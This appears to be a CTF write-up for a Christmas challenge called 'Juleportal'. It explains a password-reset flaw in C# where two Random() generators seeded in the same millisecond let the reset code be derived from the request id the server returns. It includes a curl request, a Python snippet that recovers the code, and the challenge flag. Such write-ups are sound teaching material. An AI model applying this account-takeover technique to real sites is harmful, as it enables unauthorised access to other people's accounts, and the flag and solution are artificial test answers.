# Luke 19 - Juleportal

**Author**: olefredrik

**Description**:
> Jeg tror det er det er noe spennende inne på denne serveren, men dessverre er det bare administratoren <admin@nordpolen.jul> som har tilgang. Kan du hjelpe meg å komme rundt det?

**Handout**: [handout](handout/)

```bash
./handout/
├── Dockerfile
├── Juleportal
│   ├── Data
│   │   └── DatabaseKontekst.cs
│   ├── HttpTjener.cs
│   ├── Kontrollere
│   │   └── AutentiseringKontroller.cs
│   ├── Modeller
│   │   ├── Bruker.cs
│   │   └── Sesjon.cs
│   ├── Program.cs
│   ├── Tjenester
│   │   ├── Sesjonstjeneste.cs
│   │   └── SlumptallsgeneratorTjeneste.cs
│   └── nettside
│       └── index.html
└── compose.yml

7 directories, 11 files
```

## Writeup

The vulnerability is in the password-reset flow: the server returns a `forespørselsId` (request id) and also generates a reset code, but both are generated with `new Random()` back-to-back. When both `Random()` instances are seeded with the same timestamp (same millisecond), the reset code becomes derivable from the request id.

### Cause

In `SlumptallsgeneratorTjeneste.cs` we see:

```cs
public string GenererForespørselsId()
{
    var slumptallsgenerator = new Random();
    
    var bytes = new byte[16];
    slumptallsgenerator.NextBytes(bytes);
    
    return new Guid(bytes).ToString();
}

public string GenererTilbakestillingskode()
{
   var slumptallsgenerator = new Random();

   var kodeBytes = new byte[10];
   slumptallsgenerator.NextBytes(kodeBytes);

   return Convert.ToBase64String(kodeBytes);
}
```

- `GenererForespørselsId()` creates a GUID from 16 `Random()` bytes.
- `GenererTilbakestillingskode()` base64-encodes 10 `Random()` bytes.
- In `GlemtPassord()`, these happen immediately after each other, so the first 10 bytes of the GUID match the reset-code bytes (when the RNG seeds match).

```cs
public string GlemtPassord(string epost)
{
   var forespørselId = _slumptallsgeneratorTjeneste.GenererForespørselsId();

   var tilbakestillingskode = _slumptallsgeneratorTjeneste.GenererTilbakestillingskode();
   if (string.IsNullOrWhiteSpace(epost))
   {
       return LagSvar(false, "E-post er påkrevd", forespørselId);
   }

   var bruker = _database.HentBrukerMedEpost(epost);

   if (bruker != null)
   {
       var utløper = DateTimeOffset.UtcNow.AddMinutes(15).ToUnixTimeSeconds();
       _database.OppdaterTilbakestillingskode(epost, tilbakestillingskode, utløper);
       // ÅGJØRE: Implementer epostutsending    
   }

   return LagSvar(true, "Hvis e-posten eksisterer, har vi sendt en tilbakestillingskode. Sjekk innboksen din! 📧🎁", forespørselId);
}
```

## How It Was Solved

Requested a password reset for the admin account and copied `forespørselsId` from the response:

```bash
curl -s https://6b3ffbd87d988091.julec.tf/api/autentisering/glemt-passord -H 'Content-Type: application/json' --data '{"epost":"admin@nordpolen.jul"}'
```

Then making the python solver with a simple decrypter:

```python
b = uuid.UUID("forespørselsId").bytes_le
print(base64.b64encode(b[:10]).decode())
```

I then put that `forespørselsId` into that decryptor, then ran it to get the reset code:

- `python3 ./solve.py`

Pasted the output of the decryted  `tilbakestillingskode` into the `kode` field and reset the admin password.

Bingo! The password is reset, i can then log into the admin account with the new password. After logging in i get the flag:

### Flag: `JUL{s4mme_r4nd0m_hv4_3r_sj4n53n?!}`
